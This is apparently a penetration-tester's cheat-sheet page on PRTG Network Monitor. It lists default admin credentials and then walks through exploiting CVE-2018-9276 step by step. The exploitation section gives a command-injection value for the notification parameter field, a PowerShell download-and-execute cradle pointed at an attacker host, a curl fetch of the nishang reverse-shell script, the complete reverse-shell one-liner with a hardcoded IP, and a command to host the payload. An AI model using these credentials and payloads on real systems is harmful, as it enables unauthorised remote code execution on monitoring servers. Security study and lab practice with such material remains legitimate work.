---
Primary_category: "[[WEB TECHNOLOGIES]]"
title: "PRTG"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[WEB TECHNOLOGIES]]

#### *Discovery | Footprinting | Enumeration*

##### *Default Ports*

This service tipically listens on common web ports such as *80*, *443* or *8080*

> ***Nmap Scan Sample***

```bash
PORT      STATE SERVICE       VERSION
8080/tcp  open  http          Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
```

##### *Default Credentials*

```bash
prtgadmin:prtgadmin
prtgadmin:admin
prtgadmin:Welcome
prtgadmin:Welcome1
prtgadmin:Password123
```

##### *PRTG Version*

###### *Curl*

```bash
curl --silent --location --request GET '<URL>' | grep -i --color -- 'version' 
```

###### *Nmap*

Let's assume that the service is listening on port *8080*. That said, proceed as follows

```bash
nmap -p8080 --open -sC -sV -v -n -Pn --disable-arp-ping <TARGET>
```

---

#### *Code Execution*

##### *CVE-2018-9276*

> ***[CVE-2018-9276](https://codewatch.org/2018/06/25/prtg-18-2-39-command-injection-vulnerability/)***

This vulnerability leverages a security flaw during a *notification* creation from the administration panel. The *parameter* field is passed directly into a *Powershell* script without any type of validation and sanitizacion

Therefore, an adversary could add a filename followed by a semicolon and a system command, such as **`ping -n 1 <ATTACKER_IP>`**, within the *parameter* field

When the notification is created, it can be tested by selecting an existing option on the *Notifications* menu, then the command will be executed

###### *Creating the Malicious Notification*

Just access to the following location →

> ***Setup → Account Settings → Notifications***

![[PRTG-20260329193723329.webp|350]]

> ***Zoom in***

Then, select the *Add new notification* icon

![[PRTG-20260329193906736.webp|350]]

> ***Zoom in***

When creating the given notification, we just have to do two things

- ***Name the notification***

![[PRTG-20260329194345413.webp|350]]

> ***Zoom in***

- ***Enable the "Execute Program" section, select "Demo exe notification - outfile.ps1" as "Program File" and enter the value below in the parameter field***

```bash
test.txt ; <COMMAND> # e.g. test.txt ; ping -n 1 <ATTACKER>
```

![[PRTG-20260329195019576.webp|350]]

> ***Zoom in***

Instead of a *ping* command, we can enter the following command in order to gain system access through a *reverse shell*

```bash
IEX (New-Object Net.WebClient).downloadString('http://<ATTACKER_IP>:<PORT>/rev.ps1')
```

Then, we select the *Save* option. Once the notification is created, it will be displayed on the *notifications* section as below

![[PRTG-20260330171818414.webp|350]]

> ***Zoom in***

Next, simply download the following reverse shell oneliner in *powershell* and replace the *IP Address* and the *TCP* port

```bash
curl --silent --location --request GET 'https://github.com/samratashok/nishang/raw/refs/heads/master/Shells/Invoke-PowerShellTcpOneLine.ps1' --output rev.ps1
```

> [!BUG]- *rev.ps1*
>
> ```bash
> $client = New-Object System.Net.Sockets.TCPClient('10.10.15.63',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
> ```
>

Lastly, set up an *HTTP* server to share the resource above and run a test for the notification you created

```bash
python3 -m http.server 80
```

> ***Sending a test notification***

To do so, just click the given notification and select the *Send test notification* option

![[PRTG-20260330172746246.webp|350]]

> ***Zoom in***

After that, the powershell command we entered previously will be executed and we will receive an incoming reverse shell